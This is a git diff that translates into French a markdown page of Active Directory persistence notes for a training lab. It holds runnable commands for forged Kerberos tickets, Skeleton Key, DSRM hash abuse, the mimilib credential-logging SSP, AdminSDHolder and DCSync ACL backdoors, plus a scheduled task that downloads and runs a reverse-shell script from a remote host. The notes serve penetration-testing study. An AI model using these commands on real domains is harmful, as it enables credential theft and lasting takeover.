@@ -1,189 +1,176 @@
 ---
-title: "5 - AD Persistence"
+title: "5 - Persistance Active Directory"
 ---
 
-# AD Persistence
+# Persistance Active Directory
 
-> DA is just the beggining
-> We can add persistance, escalate to EA and attack across trusts!
+La persistance permet de conserver un accès à un environnement Active Directory après une première compromission. Les notes couvrent les tickets Kerberos, les mécanismes présents sur les Domain Controllers et les permissions qui peuvent maintenir un accès.
 
-## Golden Ticket
+Les exemples utilisent le laboratoire `dollarcorp.moneycorp.local` et les machines `dcorp-dc`. Les droits nécessaires sont indiqués dans chaque technique.
 
-![Alt text](./assets/7.png)
+## Tickets Kerberos
 
+### Golden Ticket
 
-- Skips the 1 e 2 steps
-- its a signed and encrypted by the hash of krbtgt account which validates the TGT ticket
-- the krbtgt account can be used to impersonate any user with any privileges from even a non-domain machine
+Un Golden Ticket est un TGT forgé à partir du secret du compte `krbtgt`. Il permet de représenter un utilisateur du domaine avec les groupes et privilèges indiqués dans le ticket.
 
-> its recommended to change the password of the krbtgt account twice as password history is maintained for the account
+Le secret de `krbtgt` peut être récupéré sur le Domain Controller avec des privilèges Domain Admin.
 
+**Récupérer les secrets sur le contrôleur de domaine avec Mimikatz :**
 
-### How to do that
-
-**Execute mimikatz (or a variant) on DC as DA to get krbtgt hash**:
 ```powershell
 Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername dcorp-dc
 ```
 
-**To use the DCSync feature for getting AES keys for krbtgt account**. 
+**Récupérer les clés AES du compte `krbtgt` avec DCSync :**
 
-> Use the below command with DA privileges (or a user that has replication rights on the domain object):
+L'opération nécessite des privilèges Domain Admin ou des droits de réplication sur l'objet domaine. DCSync ne nécessite pas d'exécuter du code directement sur le Domain Controller.
 
 ```powershell
 C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
 ```
 
-> Using the DCSync option needs no code execution on the target DC
+**Créer un Golden Ticket avec BetterSafetyKatz :**
 
-**Run the below command to create a Golden ticket on any machine that has network connectivity with DC**:
+L'exemple utilise le SID du domaine et la clé AES du compte `krbtgt`. Le paramètre `/ptt` injecte le ticket dans la session courante.
+
 ```powershell
 C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
 ```
 
-![Alt text](./assets/8.png)
+![Golden Ticket](./assets/7.png)
 
-![Alt text](./assets/9.png)
+![Golden Ticket](./assets/8.png)
 
+![Golden Ticket](./assets/9.png)
 
+**Variante avec Loader et vérification du ticket :**
 
+```powershell
+C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit" # Récupérer la clé AES
 
+C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
 
-> [obs] Always use an active domain admin to generate tickets
-> preferable use /ptt and purge the ticket after use with klist purge
-
-
-
-Learning Objective 8
-
-- Extract secrets from the domain controller of dollarcorp.
-- Using the secrets of krbtgt account, create a Golden ticket.
-- Use the Golden ticket to (once again) get domain admin privileges from a machine.
-
-```powershell 
-C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe “lsadump::dcsync /user:dcorp\krbtgt” “exit”	# [get the aes256 hash]
-
-C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d91 4cbcb5a8c3cda848 /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
-
-klist # it shows the cached tickets
+klist
 ```
 
+`klist` affiche les tickets présents dans le cache. Les notes recommandent d'utiliser un compte Domain Admin actif pour générer les tickets et de purger le ticket après utilisation.
 
-## Silver Ticket
+```powershell
+klist purge
+```
 
-![Alt text](./assets/10.png)
+**À retenir :** le mot de passe du compte `krbtgt` doit être changé deux fois pour invalider les anciennes clés, car l'historique du mot de passe est conservé.
 
+**Objectif du laboratoire 8**
 
+- Récupérer les secrets du Domain Controller de `dollarcorp`.
+- Utiliser les secrets de `krbtgt` pour créer un Golden Ticket.
+- Utiliser le ticket depuis une machine du domaine pour retrouver des privilèges Domain Admin.
 
-- A valid TGS (Golden ticket is TGT)
-- Encrypted and Signed by the hash of the service account 
+### Silver Ticket
 
-> remember: Golden ticket is signed by hash of krbtgt
+Un Silver Ticket est un TGS forgé à partir du hash du compte de service. Contrairement au Golden Ticket, qui utilise le secret de `krbtgt`, il est limité au service ciblé.
 
-- Services rarely check PAC (Privileged Attribute Certificate)
-- Services will allow access only to the services themselves
-- Reasonable persistence period (default 30 days for computer accounts)
+- Le ticket est signé et chiffré avec le hash du compte de service.
+- Certains services vérifient rarement le PAC (Privileged Attribute Certificate).
+- Le ticket donne accès au service concerné, pas à l'ensemble du domaine.
+- Les notes indiquent une durée de persistance par défaut de 30 jours pour les comptes ordinateur.
 
-**Using hash of the Domain Controller computer account, below command provides access to file system on the DC**:
-```powershell 
+**Créer un Silver Ticket pour accéder au partage CIFS du Domain Controller :**
+
+```powershell
 C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /target:dcorp-dc.dollarcorp.moneycorp.local /service:CIFS /rc4:e9bb4c3d1327e29093dfecab8c2676f6 /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
 ```
 
-**Similar command can be used for any other service on a machine**:
+D'autres SPN sont mentionnés dans les notes : `HOST`, `RPCSS`, `HTTP` et `WSMA`.
 
-> Which services? HOST, RPCSS, HTTP, WSMA and many more.
+![Silver Ticket](./assets/10.png)
 
+![Silver Ticket](./assets/11.png)
 
-![Alt text](./assets/11.png)
+![Silver Ticket](./assets/12.png)
 
-![Alt text](./assets/12.png)
+> LAPS gère les identifiants des administrateurs locaux, pas les comptes de service. Les notes indiquent donc que le Silver Ticket ne s'applique pas à LAPS.
 
+**Créer un Silver Ticket pour le SPN HOST :**
 
+Cet exemple vise l'utilisation de tâches planifiées sur la machine cible. Les notes signalent que cette opération est bruyante.
 
-
-> LAPS - control local admin credentials, does not control service accounts
-> so, silver ticket will not be applied to laps
-
-
-
-- There are various ways of achieving command execution using Silver tickets
-
-**Create a silver ticket for the HOST SPN which will allow us to schedule a task on the target**:
 ```powershell
 C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:e9bb4c3d1327e29093dfecab8c2676f6 /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
 ```
 
-> This is Noisy
+**Créer et exécuter une tâche planifiée :**
 
-**Schedule and execute a task**:
-```powershell 
+```powershell
 schtasks /create /S dcorp-dc.dollarcorp.moneycorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "STCheck" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.1:8080/Invoke-PowerShellTcp.ps1''')'"
 schtasks /Run /S dcorp-dc.dollarcorp.moneycorp.local /TN "STCheck"
 ```
 
+**Objectif du laboratoire 9**
 
-Learning Objective 9
+Obtenir une exécution de commande sur le Domain Controller en étudiant des Silver Tickets pour les services `HOST` et WMI.
 
- Try to get command execution on the domain controller by creating silver tickets for:
+### Diamond Ticket
 
-- HOST service
-- WMI
+Un Diamond Ticket repose sur la modification d'un TGT valide :
 
+- Un TGT émis par le Domain Controller est déchiffré.
+- Certaines informations du ticket sont modifiées.
+- Le ticket est ensuite rechiffré avec les clés AES de `krbtgt`.
+- Sa durée de validité dépend du compte `krbtgt`.
 
+La différence principale avec le Golden Ticket est que le Golden Ticket forge un TGT, tandis que le Diamond Ticket modifie un TGT émis par le contrôleur de domaine.
 
-## Diamond Ticket
+Les notes présentent le Diamond Ticket comme plus discret du point de vue OPSEC, notamment parce que les dates du ticket restent cohérentes avec un TGT émis par le Domain Controller.
 
-- its created by decrypting a valid TGT, making changes to it and re-encrypt it using the AES keys of the krbtgt account
-- golden ticket was a TGT forging attacks whereas diamond ticket is a TGT modification attack
-- the persistence lifetime depends on krbtgt account
+**Créer un Diamond Ticket avec des identifiants :**
 
-A diamond ticket is more opsec safe as it has:
-```
-→ valid ticket times because a TGT issued by the DC is modified
-→ in golden ticket, there is no corresponding TGT request for TGS/Service tickert requests as the TGT is forged
-```
-
-We would still need krbtgt AES keys. **Use the following Rubeus command to create a diamond ticket** (note that RC4 or AES keys of the user can be used too):
 ```powershell
 Rubeus.exe diamond /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /user:studentx /password:StudentxPassword /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
 ```
 
-We could also use **/tgtdeleg** option in place of credentials in case we have access as a domain user:
+**Utiliser `/tgtdeleg` à la place des identifiants :**
+
+Cette variante est présentée lorsque l'utilisateur dispose déjà d'un accès avec un compte du domaine.
+
 ```powershell
-Rubeus.exe diamond /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /tgtdeleg 	/enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+Rubeus.exe diamond /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /tgtdeleg /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
 ```
 
-Learning Objective 10
+**Objectif du laboratoire 10**
 
-- Use Domain Admin privileges obtained earlier to execute the Diamond Ticket attack.
+Utiliser les privilèges Domain Admin obtenus précédemment pour étudier la technique Diamond Ticket.
 
+## Persistance sur le Domain Controller
 
+### Skeleton Key
 
-## Skeleton Key
+Skeleton Key est une technique qui modifie le processus LSASS d'un Domain Controller afin d'accepter un mot de passe commun pour les comptes utilisateurs.
 
-> not recommended to do in an assessment
-> **Its not opsec safe** and is also known to cause issues with AD CS
+- La technique nécessite des privilèges Domain Admin.
+- Le mot de passe utilisé dans l'exemple est `mimikatz`.
+- La modification n'est pas persistante après un redémarrage.
+- Les notes déconseillent son utilisation en assessment : elle est bruyante et peut provoquer des problèmes avec AD CS.
 
-- its a persistence technique where its possible to patch a Domain Controller **(lsass process)** so that it allows access as any user with a single password
+**Injecter Skeleton Key sur le Domain Controller :**
 
-> not persistent across reboots 
-
-
-Use the below command to inject a skeleton key (password would be mimikatz) on a Domain Controller of choice. 
-
-> DA privileges required
-```powershell 
+```powershell
 Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName dcorp-dc.dollarcorp.moneycorp.local
 ```
 
-Now, it is possible to access any machine with a valid username and password as **mimikatz**:
+**Ouvrir une session avec le mot de passe commun :**
+
 ```powershell
-Enter-PSSession -Computername dcorp-dc -credential dcorp\Administrator
+Enter-PSSession -Computername dcorp-dc -Credential dcorp\Administrator
 ```
 
+**Cas où LSASS fonctionne comme un Protected Process :**
 
-In case lsass is running as a protected process, we can still use Skeleton Key but it needs the mimikatz driver (**mimidriv.sys**) on disk of the target DC:
-```powershell
+Les notes indiquent que cette variante nécessite le driver Mimikatz `mimidriv.sys` présent sur le Domain Controller.
+
+```text
 mimikatz # privilege::debug
 mimikatz # !+
 mimikatz # !processprotect /process:lsass.exe /remove
@@ -191,356 +178,396 @@ mimikatz # misc::skeleton
 mimikatz # !-
 ```
 
-> [NOTE] That above would be **very noisy in logs** - Service installation (Kernel mode driver) 
+> Cette opération est très bruyante dans les journaux : elle implique notamment l'installation d'un driver en mode kernel.
 
+**Exemple de modification de la clé par défaut :**
 
-You may like to modify the default key injected by Mimikatz!
+Les notes prennent le mot de passe `S3c3rtP@ss` comme exemple et présentent les valeurs RC4 découpées en blocs.
 
-[Line 611 in kuhl_m_misc.c](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kuhl_m_misc.c#L611)
-
-
-For example, to use **S3c3rtP@ss**, compute its RC4 and split it into 8 bytes stubs:
-```powershell
+```text
 56aa742a
 6bebb9ca
 62fc9f70
 a2e00cd3
 ```
 
--  Reverse the values by 2 bytes
+**Inverser les valeurs par groupes de deux octets :**
 
-```powershell
+```text
 2a74aa56
 cab9eb6b
 709ffc62
 d30ce0a2
 ```
 
-Prepend 0x to each and modify kiwikey array value in the code linked above
-```powershell
+**Format de la valeur `kiwiKey` présenté dans le code source Mimikatz :**
+
+```c
 DWORD kiwiKey[] = {0x2a74aa56, 0xcab9eb6b, 0x709ffc62, 0xd30ce0a2}
 ```
 
+[Code source Mimikatz - kuhl_m_misc.c, ligne 611](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kuhl_m_misc.c#L611)
 
-## DSRM
-Directory Services Restore Mode
+### DSRM
 
-- There is a local admin is every DC called *Administrator* whose password is the DSRM password
-- DSRM password (**SafeModePassword**) is required when a server is promoted to DC and its rarely changed
-- After altering the configuration on the DC, its possible to pass the NTLM hash of this user to access the DC
+DSRM signifie Directory Services Restore Mode. Chaque Domain Controller possède un compte Administrateur local associé au mot de passe DSRM.
 
-**Dump DSRM password**:
+- Le mot de passe DSRM, aussi appelé `SafeModePassword`, est défini lors de la promotion du serveur en Domain Controller.
+- Il est rarement modifié.
+- Après modification du comportement d'ouverture de session, le hash NTLM du compte local peut être utilisé pour s'authentifier sur le Domain Controller.
 
-> needs DA privs
+**Récupérer le hash du compte Administrateur DSRM :**
+
+L'opération nécessite des privilèges Domain Admin.
 
 ```powershell
 Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -Computername dcorp-dc
 ```
 
-**Compare the Administrator hash with the Administrator hash of below command**:
+**Comparer avec le hash du compte Administrateur du domaine :**
+
 ```powershell
 Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername dcorp-dc
 ```
 
-> First one is the DSRM local Administrator 
+Le premier résultat correspond au compte Administrateur local DSRM.
 
+**Ouvrir une session distante sur le Domain Controller :**
 
-- Since it is the local administrator of the DC, we can pass the hash to authenticate.
-
-But, **the Logon Behavior for the DSRM account needs to be changed before we can use its hash**:
 ```powershell
-Enter-PSSession -Computername dcorp-dc New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
+Enter-PSSession -Computername dcorp-dc
 ```
 
-**Use below command to pass the hash**:
+**Modifier le comportement d'ouverture de session DSRM :**
+
 ```powershell
-Invoke-Mimikatz -Command '"sekurlsa::pth /domain:dcorp-dc /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:powershell.exe"' 
+New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
+```
+
+**Utiliser le hash NTLM pour s'authentifier :**
+
+```powershell
+Invoke-Mimikatz -Command '"sekurlsa::pth /domain:dcorp-dc /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:powershell.exe"'
 ls \\dcorp-dc\C$
 ```
 
+**Objectif du laboratoire 11**
 
-Learning Objective 11
+Étudier l'utilisation du compte DSRM et de ses identifiants dans un scénario de persistance.
 
-- Use Domain Admin privileges obtained earlier to abuse the DSRM credential for persistence.
+### Custom SSP
 
-> OPSEC order: **Silver** > **Diamond** > **Golden**
+Un Security Support Provider (SSP) est une DLL qui fournit à une application des mécanismes d'authentification. Les SSP Microsoft cités dans les notes sont :
 
-
-
-
-## Custom SSP
-
-A Security Support Provider (SSP) is a DLL which provides ways for an application to obtain an authenticated connection. Some SSP Packages by Microsoft are:
-```
-– NTLM
-– Kerberos
-– Wdigest
-– CredSSP
+```text
+NTLM
+Kerberos
+WDigest
+CredSSP
 ```
 
-Mimikatz provides a custom SSP - **mimilib.dll**. This SSP logs local logons, service account and machine account passwords in clear text on the target server.
+Mimikatz fournit un SSP personnalisé appelé `mimilib.dll`. Il peut enregistrer en clair les mots de passe des comptes locaux, des comptes de service et des comptes machine sur le serveur cible.
 
-**We can use either of the ways**:
+**Ajouter `mimilib` dans les Security Packages :**
+
+Déposer d'abord `mimilib.dll` dans `C:\Windows\System32`. La commande suivante récupère la liste actuelle des packages, ajoute `mimilib` puis met à jour les deux emplacements du registre.
+
 ```powershell
-# Drop the mimilib.dll to system32 and add mimilib to HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages:
-
-$packages = Get-ItemProperty
-HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages'| select -ExpandProperty 'Security Packages'
+$packages = Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' | Select-Object -ExpandProperty 'Security Packages'
 $packages += "mimilib"
 Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' -Value $packages
 Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name 'Security Packages' -Value $packages
 ```
 
-**Using mimikatz, inject into lsass (Not super stable with Server 2019 and Server 2022 but still usable)**:
+**Autre méthode : utiliser Mimikatz pour charger le SSP dans LSASS :**
+
+Les notes signalent une stabilité limitée avec Windows Server 2019 et 2022.
+
 ```powershell
 Invoke-Mimikatz -Command '"misc::memssp"'
 ```
 
-**All local logons on the DC are logged to**:
-```powershell
+**Emplacement du fichier de journalisation :**
+
+```text
 C:\Windows\system32\mimilsa.log
 ```
 
-## Persistence using ACLs - AdminSDHolder
+## Persistance par les ACL Active Directory
 
-- Resides in the System container of a domain and used to control the permissions - using an ACL - for certain built-in privileged groups (called **Protected Groups**).
-- **Security Descriptor Propagator** (SDPROP) runs every hour and compares the ACL of protected groups and members with the ACL of **AdminSDHolder** and any differences are overwritten on the object ACL.
+### AdminSDHolder
 
-![Alt text](./assets/13.png)
+L'objet AdminSDHolder se trouve dans le conteneur `System` du domaine. Il sert de référence pour les permissions ACL de certains groupes privilégiés, appelés Protected Groups.
 
-![Alt text](./assets/14.png)
+Le processus Security Descriptor Propagator (SDPROP) s'exécute toutes les heures. Il compare les ACL des groupes protégés et de leurs membres avec celles d'AdminSDHolder, puis réapplique les permissions de référence lorsque des différences sont détectées.
 
+Avec des droits Domain Admin ou des permissions suffisantes sur AdminSDHolder, il est possible d'ajouter des permissions à un utilisateur. Lors de l'exécution de SDPROP, ces permissions sont propagées aux objets protégés, par exemple Domain Admins, sans que l'utilisateur soit nécessairement membre du groupe.
 
-- With DA privileges (Full Control/Write permissions) on the AdminSDHolder object, it can be used as a **backdoor/persistence** mechanism by adding a user with Full Permissions (or other interesting permissions) to the AdminSDHolder object.
-- In 60 minutes (when SDPROP runs), the user will be added with Full Control to the AC of groups like Domain Admins without actually being a member of it.
+![AdminSDHolder](./assets/13.png)
 
+![AdminSDHolder](./assets/14.png)
 
-### How to do it
+**Ajouter FullControl à un utilisateur avec PowerView :**
 
-**Add FullControl permissions for a user to the AdminSDHolder using PowerView as DA**:
+L'exemple utilise `student1` comme principal et nécessite des droits suffisants sur l'objet AdminSDHolder.
+
 ```powershell
-Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc-dollarcorp,dc=moneycorp,dc=local' -PrincipalIdentity student1 -Rights All -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
+Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity student1 -Rights All -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
 ```
 
-**Using ActiveDirectory Module and RACE toolkit**:
-
-[RACE on GitHub](https://github.com/samratashok/RACE)
+**Utiliser le module ActiveDirectory et le toolkit RACE :**
 
 ```powershell
 Set-DCPermissions -Method AdminSDHolder -SAMAccountName student1 -Right GenericAll -DistinguishedName 'CN=AdminSDHolder,CN=System,DC=dollarcorp,DC=moneycorp,DC=local' -Verbose
 ```
 
-**Other interesting permissions (ResetPassword, WriteMembers) for a user to the AdminSDHolder**:
-```powershell
-Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc=dollarcorp,dc=moneycorp,dc=loc	al' -PrincipalIdentity student1 -Rights ResetPassword -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
+[RACE sur GitHub](https://github.com/samratashok/RACE)
 
-Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc-dollarcorp,dc=moneycorp,dc=local' -PrincipalIdentity student1 -Rights WriteMembers -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
+**Ajouter les droits ResetPassword et WriteMembers :**
+
+```powershell
+Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity student1 -Rights ResetPassword -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
+
+Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity student1 -Rights WriteMembers -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
 ```
 
-**Run SDProp manually using Invoke-SDPropagator.ps1 from Tools directory**:
+**Déclencher SDPROP manuellement :**
+
 ```powershell
 Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose
 ```
 
-**For pre-Server 2008 machines**:
+Pour les systèmes antérieurs à Windows Server 2008 :
+
 ```powershell
 Invoke-SDPropagator -taskname FixUpInheritance -timeoutMinutes 1 -showProgress -Verbose
 ```
 
-**Check the Domain Admins permission - PowerView as normal user**:
+**Vérifier les permissions sur Domain Admins avec PowerView :**
+
+Cette vérification peut être effectuée avec un compte utilisateur standard.
+
 ```powershell
 Get-DomainObjectAcl -Identity 'Domain Admins' -ResolveGUIDs | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "student1"}
 ```
 
-**Using ActiveDirectory Module**:
+**Vérifier les permissions avec le module ActiveDirectory :**
+
 ```powershell
 (Get-Acl -Path 'AD:\CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local').Access | ?{$_.IdentityReference -match 'student1'}
 ```
 
-**Abusing FullControl using PowerView**:
+**Exemples d'utilisation du droit FullControl :**
+
+Avec PowerView :
+
 ```powershell
 Add-DomainGroupMember -Identity 'Domain Admins' -Members testda -Verbose
 ```
 
-**Using ActiveDirectory Module**:
+Avec le module ActiveDirectory :
+
 ```powershell
 Add-ADGroupMember -Identity 'Domain Admins' -Members testda
 ```
 
-**Abusing ResetPassword using PowerView**:
+**Exemples d'utilisation du droit ResetPassword :**
+
+Avec PowerView :
+
 ```powershell
 Set-DomainUserPassword -Identity testda -AccountPassword (ConvertTo-SecureString "Password@123" -AsPlainText -Force) -Verbose
 ```
 
-**Using ActiveDirectory Module**:
+Avec le module ActiveDirectory :
+
 ```powershell
 Set-ADAccountPassword -Identity testda -NewPassword (ConvertTo-SecureString "Password@123" -AsPlainText -Force) -Verbose
 ```
 
-**Abusing ResetPassword using PowerView**:
-```powershell
-Set-DomainUserPassword -Identity testda -AccountPassword (ConvertTo-SecureString "Password@123" -AsPlainText -Force) -Verbose
+### ACL du domaine et droits DCSync
+
+Les ACL de la racine du domaine peuvent accorder des permissions étendues, comme FullControl ou les droits nécessaires à DCSync.
+
+Les notes indiquent que Microsoft Defender for Identity (MDI) peut détecter une opération DCSync lancée par un compte autre qu'un contrôleur de domaine.
+
+**Droits nécessaires pour DCSync :**
+
+```text
+Replicating Directory Changes
+Replicating Directory Changes All
+Replicating Directory Changes in Filtered Set (dans certains cas)
 ```
 
-**Using ActiveDirectory Module**:
-```powershell
-Set-ADAccountPassword -Identity testda -NewPassword (ConvertTo-SecureString "Password@123" -AsPlainText -Force) -Verbose
-```
+**Exemple de requête DCSync :**
 
-
-## ACLs - Rights Abuse
-
-
-> With DA privileges, the ACL for the domain root can be modified to provide useful rights like **FullControl** or the ability to **run DCSync** for any user.
-
-> Noisy - detect by MDI because an user other than dc is running dcsync
-
-The permissions the user must have to execute DCSync:
-```
-- Replicating Directory Changes
-- Replicating Directory Changes All
-- Replicating Directory Changes in Filtered Set (in some cases)
-```
-
-**DCsync**:
-```powershell
-C:\AD\Tools\SafetyKatz.exe “lsadump::dcsync /user:dcorp\krbtgt” “exit”
-```
-
-**Add FullControl rights**:
-```powershell
-Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity student1 -Rights All -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
-```
-
-**Using ActiveDirectory Module and RACE**:
-```powershell
-Set-ADACL -SamAccountName studentuser1 -DistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -Right GenericAll -Verbose
-```
-
-**Add rights for DCSync**:
-```powershell
-Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity student1 -Rights DCSync -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
-```
-
-**Using ActiveDirectory Module and RACE**:
-```powershell
-Set-ADACL -SamAccountName studentuser1 -DistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -GUIDRight DCSync -Verbose
-```
-
-**Execute DCSync**:
-```powershell
-Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
-```
-or
 ```powershell
 C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
 ```
 
+**Ajouter FullControl sur la racine du domaine avec PowerView :**
 
-Learning Objective 12
-
-- Check if studentx has Replication (DCSync) rights.
-- If yes, execute the DCSync attack to pull hashes of the krbtgt user.
-- If no, add the replication rights for the studentx and execute the DCSync attack to pull hashes of the krbtgt user.
-
-
-
-## ACLs - Security Descriptors
-
-- It is possible to modify **Security Descriptors** (security information like Owner, primary group, DACL and SACL) of multiple remote access methods (securable objects) to allow access to non-admin users.
-- Administrative privileges are required for this.
-- It, of course, works as a very useful and impactful **backdoor mechanism**
-
-**Security Descriptor Definition Language defines the format which is used to describe a security descriptor. SDDL uses ACE strings for DACL and SACL**:
 ```powershell
+Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity student1 -Rights All -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
+```
+
+**Utiliser le module ActiveDirectory et RACE :**
+
+```powershell
+Set-ADACL -SamAccountName studentuser1 -DistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -Right GenericAll -Verbose
+```
+
+**Ajouter les droits de réplication DCSync avec PowerView :**
+
+```powershell
+Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity student1 -Rights DCSync -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
+```
+
+**Utiliser le module ActiveDirectory et RACE :**
+
+```powershell
+Set-ADACL -SamAccountName studentuser1 -DistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -GUIDRight DCSync -Verbose
+```
+
+**Exécuter DCSync avec Invoke-Mimikatz :**
+
+```powershell
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
+```
+
+**Exécuter DCSync avec SafetyKatz :**
+
+```powershell
+C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
+```
+
+**Objectif du laboratoire 12**
+
+- Vérifier si `studentx` possède les droits de réplication DCSync.
+- Si les droits sont présents, les utiliser pour récupérer les hashes du compte `krbtgt`.
+- Si les droits ne sont pas présents, ajouter les droits de réplication à `studentx` puis exécuter DCSync pour récupérer les hashes du compte `krbtgt`.
+
+### Security Descriptors
+
+Les Security Descriptors décrivent les informations de sécurité d'un objet, notamment :
+
+- Owner.
+- Primary group.
+- DACL.
+- SACL.
+
+Les notes indiquent que les Security Descriptors de plusieurs objets distants (securable objects) peuvent être modifiés pour accorder un accès à des utilisateurs non administrateurs. Des privilèges administratifs sont nécessaires.
+
+**Structure d'une ACE en SDDL :**
+
+```text
 ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid
 ```
 
-**ACE for built-in administrators for WMI namespaces**:
-```powershell
+**Exemple d'ACE pour les administrateurs intégrés sur un namespace WMI :**
+
+```text
 A;CI;CCDCLCSWRPWPRCWD;;;SID
 ```
 
-## WMI
+## Persistance via les interfaces d'administration distantes
 
-ACLs can be modified to allow non-admin users access to securable objects. 
+### WMI
 
-**Using the RACE toolkit**:
